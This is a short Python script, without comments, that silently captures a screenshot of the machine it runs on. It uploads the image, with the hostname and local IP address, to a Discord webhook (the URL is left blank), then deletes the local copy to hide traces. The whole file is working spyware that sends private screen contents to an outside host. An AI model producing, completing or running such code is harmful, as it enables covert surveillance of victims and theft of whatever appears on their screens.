import pyautogui
import os
from os.path import expanduser
from discord_webhook import DiscordWebhook
import socket

home = expanduser("~")
try:
    os.mkdir(home+"/screenshots")
except:
    pass
img = pyautogui.screenshot(home+"/screenshots/screensh.jpg")
webhook_url = ""
webhook = DiscordWebhook(url=webhook_url, username=socket.gethostname(), content=f"IP: {socket.gethostbyname(socket.gethostname())}")
with open(home+"/screenshots/screensh.jpg", "rb") as f:
    webhook.add_file(file=f.read(), filename='example.jpg')
webhook.execute()
os.remove(home+"/screenshots/screensh.jpg")
